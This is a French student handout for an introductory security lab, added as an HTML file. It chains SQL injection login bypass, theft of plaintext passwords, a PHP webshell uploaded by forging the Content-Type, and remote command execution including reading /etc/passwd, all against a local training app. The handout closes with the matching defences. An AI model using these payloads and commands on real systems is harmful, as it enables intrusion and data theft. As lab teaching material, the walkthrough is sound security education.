@@ -1,0 +1,106 @@
+<!-- app_intro-compromission/enonce/enonce-etudiant.html -->
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Intro — Comment une application se fait-elle compromettre ?</title>
+<meta name="description" content="Lab d'introduction : enchainer injection SQL, recuperation du compte admin et upload d'un webshell (contournement de filtre) jusqu'a l'execution de commandes.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intro — Comment une application se fait-elle compromettre ?">
+<meta property="og:description" content="SQLi -> admin -> webshell -> RCE : la chaine complete d'une compromission, a reproduire en lab isole.">
+<meta property="og:site_name" content="Résistez aux hackeurs">
+<meta property="og:locale" content="fr_FR">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🩸%3C/text%3E%3C/svg%3E">
+<style>
+:root{--bg:#f6f7f9;--ink:#1a1a2e;--accent:#0f3460;--accent2:#16213e;--red:#e94560;--code-bg:#1b1f2a;--ok:#1b7f4b;}
+*{box-sizing:border-box}body{font-family:system-ui,sans-serif;line-height:1.6;color:var(--ink);background:var(--bg);margin:0}
+.wrap{max-width:860px;margin:0 auto;padding:32px 20px 80px}
+header.doc{background:linear-gradient(135deg,#2a1a3e,#8b1a1a);color:#fff;padding:36px 20px;border-radius:0 0 16px 16px}
+header.doc h1{margin:0 0 6px;font-size:25px}header.doc .meta{opacity:.9;font-size:14px}
+.badge{display:inline-block;background:#111;color:#fff;font-size:12px;font-weight:700;padding:3px 10px;border-radius:20px}
+h2{color:var(--accent2);margin-top:34px;border-bottom:2px solid #e3e6ea;padding-bottom:6px}h3{color:var(--accent);margin-top:22px}
+code{background:#eef0f3;padding:1px 6px;border-radius:4px;font-size:90%}
+pre{background:var(--code-bg);color:#e6e6e6;padding:14px 16px;border-radius:8px;overflow-x:auto;font-size:13px;line-height:1.5}
+pre code{background:none;padding:0;color:inherit}
+.obj{border-left:4px solid var(--ok);background:#eaf6ef;padding:12px 16px;border-radius:6px;margin:16px 0}
+.note{border-left:4px solid var(--accent);background:#eef3fb;padding:12px 16px;border-radius:6px;margin:16px 0}
+.warn{border-left:4px solid var(--red);background:#fdecef;padding:12px 16px;border-radius:6px;margin:16px 0}
+.step{border-left:4px solid #8b1a1a;background:#fff;border:1px solid #f0d8dd;border-radius:8px;padding:4px 18px 14px;margin:18px 0}
+.livrable{background:#fff7e6;border:1px solid #ffe2a8;border-radius:8px;padding:14px 18px;margin-top:12px}
+ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:13px;margin-top:50px}
+</style></head>
+<body>
+<header class="doc"><div class="wrap" style="padding:0">
+<span class="badge">INTRO · NIVEAU 0 — avant de commencer le cours</span>
+<h1>🩸 Comment une application se fait-elle compromettre ?</h1>
+<div class="meta">Chaîne complète : injection SQL → récupération du compte admin → upload d'un webshell → exécution de commandes · Durée : 45 min</div>
+</div></header>
+<div class="wrap">
+
+<div class="warn"><strong>Cadre légal.</strong> Les techniques ci-dessous ne s'appliquent QUE sur ce lab, isolé, qui vous appartient. Les reproduire sur un système dont vous n'avez pas l'autorisation écrite est un délit.</div>
+
+<div class="obj"><strong>Objectif pédagogique</strong>
+<p style="margin:.4em 0">Ne pas (encore) apprendre à défendre, mais <strong>voir de ses yeux</strong> ce que veut dire « une appli est compromise » : partir d'un simple champ de login et finir avec un <strong>shell sur le serveur</strong>. Chaque étape ouvre la suivante.</p>
+</div>
+
+<h2>Mise en route</h2>
+<p>Le formateur a lancé le lab (sinon : <code>docker compose -f docker-compose.local.yml up -d --build</code>). L'application est sur :</p>
+<pre><code>http://localhost:8080</code></pre>
+<p>Outils : un navigateur, et <code>curl</code> (ou Burp Suite). C'est le portail interne « CorpLab ». Vous n'avez aucun compte.</p>
+
+<div class="step">
+<h3>Étape 1 — Entrer sans mot de passe (injection SQL)</h3>
+<p>Le formulaire de login colle vos saisies directement dans une requête SQL :</p>
+<pre><code>SELECT * FROM users WHERE username = '<i>ce_que_vous_tapez</i>' AND password = '...'</code></pre>
+<p>Si le nom d'utilisateur contient une apostrophe, vous « sortez » de la chaîne et vous réécrivez la requête. Tapez dans le champ <strong>Identifiant</strong> :</p>
+<pre><code>admin'-- -</code></pre>
+<p>…n'importe quoi dans le mot de passe. Le <code>--</code> transforme la fin de la requête (la vérification du mot de passe) en commentaire. La requête devient :</p>
+<pre><code>SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...'</code></pre>
+<p>Vous êtes connecté en <strong>admin</strong>, sans jamais avoir connu son mot de passe.</p>
+<div class="livrable"><strong>Q1.</strong> Expliquez avec vos mots pourquoi <code>admin'-- -</code> fonctionne. Que se passerait-il avec <code>' OR '1'='1</code> ?</div>
+</div>
+
+<div class="step">
+<h3>Étape 2 — Récupérer les identifiants (le dashboard admin)</h3>
+<p>Le tableau de bord administrateur affiche tous les comptes… avec leurs mots de passe <strong>en clair</strong>. Vous repartez avec le mot de passe réel de l'admin et de tous les utilisateurs.</p>
+<div class="note">Deux fautes se cumulent : l'injection SQL (entrer sans autorisation) <em>et</em> le stockage des mots de passe en clair (une fois dedans, tout est exposé). Dans la vraie vie, c'est comme ça que des bases entières fuitent.</div>
+<div class="livrable"><strong>Q2.</strong> Notez le mot de passe de <code>admin</code>. Pourquoi stocker les mots de passe en clair aggrave-t-il énormément la fuite ?</div>
+</div>
+
+<div class="step">
+<h3>Étape 3 — Déposer un webshell (contourner le filtre d'upload)</h3>
+<p>Le dashboard permet d'« ajouter un visuel produit ». On va y déposer non pas une image mais un petit script PHP — un <strong>webshell</strong> — qui exécute les commandes qu'on lui passe :</p>
+<pre><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code></pre>
+<p>Le filtre refuse ce qui n'est pas une image. Mais il ne regarde que le <strong>type annoncé par le navigateur</strong> (<code>Content-Type</code>) — une information… fournie par le client, donc falsifiable.</p>
+<p><strong>Tentative honnête</strong> (refusée) :</p>
+<pre><code>curl -b c.txt -F "image=@shell.php" http://localhost:8080/admin.php
+# -&gt; "Refusé : seules les images sont acceptées"</code></pre>
+<p><strong>Avec contournement</strong> — on ment sur le type en annonçant <code>image/png</code> :</p>
+<pre><code># d'abord se connecter en admin et garder le cookie de session :
+curl -i -c c.txt --data-urlencode "username=admin'-- -" --data-urlencode "password=x" \
+  http://localhost:8080/index.php
+
+# puis uploader le webshell en se faisant passer pour une image :
+curl -b c.txt -F "image=@shell.php;type=image/png" http://localhost:8080/admin.php
+# -&gt; "Visuel enregistré : uploads/shell.php"</code></pre>
+<div class="note"><strong>Avec Burp Suite</strong> (ou sous Windows) : uploadez une vraie image via le formulaire, interceptez la requête, remplacez le nom par <code>shell.php</code>, le contenu par le code PHP, et laissez/forcez <code>Content-Type: image/png</code>. Même résultat.</div>
+<div class="livrable"><strong>Q3.</strong> Le filtre « n'autorise que les images » : pourquoi est-il inutile ? Qui contrôle le <code>Content-Type</code> ?</div>
+</div>
+
+<div class="step">
+<h3>Étape 4 — Exécuter des commandes (RCE = compromission)</h3>
+<p>Le fichier déposé est servi par le serveur web, qui <strong>exécute</strong> le PHP. Vous pilotez maintenant le serveur depuis l'URL :</p>
+<pre><code>curl "http://localhost:8080/uploads/shell.php?cmd=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+curl "http://localhost:8080/uploads/shell.php?cmd=whoami;hostname"
+curl "http://localhost:8080/uploads/shell.php?cmd=cat%20/etc/passwd"</code></pre>
+<p>Ou directement dans le navigateur : <code>http://localhost:8080/uploads/shell.php?cmd=ls%20-la</code>.</p>
+<div class="livrable"><strong>Q4.</strong> Listez 3 commandes qui montrent que vous « tenez » la machine (lecture de fichiers, utilisateurs, réseau…). Qu'est-ce qu'un attaquant ferait ensuite ?</div>
+</div>
+
+<h2>Ce que vous venez de faire</h2>
+<p>En quatre étapes, à partir d'un champ de connexion, vous avez : contourné l'authentification, volé toutes les données d'accès, déposé du code sur le serveur et exécuté des commandes arbitraires. <strong>C'est ça, « compromettre une application ».</strong> Une seule faille suffit rarement : ici elles se <strong>chaînent</strong>, chacune amplifiant la précédente.</p>
+
+<div class="note"><strong>Et on évite ça comment ?</strong> C'est tout l'objet du cours qui suit : requêtes préparées (SQLi), hachage des mots de passe, validation du <em>contenu</em> des fichiers + interdiction d'exécution dans les dossiers d'upload, et surtout une <strong>chaîne CI/CD</strong> qui attrape ces fautes avant la mise en production.</p></div>
+
+<footer class="doc">Formation CI/CD &amp; DevSecOps · Résistez aux hackeurs · Intro — énoncé étudiant</footer>
+</div></body></html>
